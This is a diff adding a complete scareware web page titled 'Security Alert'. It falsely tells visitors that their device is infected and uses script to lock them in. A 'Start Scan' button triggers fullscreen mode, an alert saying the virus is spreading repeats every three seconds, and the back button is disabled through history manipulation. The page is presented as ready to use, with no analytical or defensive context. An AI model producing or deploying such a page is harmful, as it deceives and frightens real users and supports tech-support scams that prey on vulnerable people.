@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Security Alert</title>
+</head>
+
+<body style="background:black; color:red; text-align:center; font-family:sans-serif;">
+
+<h1>⚠️ WARNING!</h1>
+<h2>Your Device Has Been Infected</h2>
+<p>Virus detected... Do not exit!</p>
+
+<button onclick="enterFullScreen()" style="padding:10px;">Start Scan</button>
+
+<script>
+// Full screen
+function enterFullScreen() {
+  document.documentElement.requestFullscreen();
+}
+
+// Fake alert spam
+setInterval(() => {
+  alert("⚠️ Virus spreading... Do not close!");
+}, 3000);
+
+// Back button block
+history.pushState(null, null, location.href);
+window.onpopstate = function () {
+  history.go(1);
+};
+</script>
+
+</body>
+</html>
